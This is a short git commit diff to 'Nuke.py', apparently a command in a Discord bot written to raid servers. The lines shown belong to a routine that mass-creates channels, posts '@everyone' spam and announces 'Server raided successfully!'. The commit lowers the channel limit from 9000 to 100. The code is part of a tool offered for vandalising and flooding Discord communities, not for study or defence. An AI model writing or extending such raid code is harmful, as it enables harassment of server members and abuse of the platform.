481b846e8c866e70556d344c6bffa2a9de117951
f2708074-del <f2708074@gmail.com>
2025-08-24 03:42:49 +0200

    Update Nuke.py

--- commands/Nuke.py
+++ commands/Nuke.py
@@ -100,7 +100,7 @@ class Announce(commands.Cog):
             
             # 5. Crear canales
             spam_message = f"@everyone {message}"
-            max_channels = 9000
+            max_channels = 100
             raid_message = "✅ Server raided successfully!"
             
             # Crear canales rápidamente
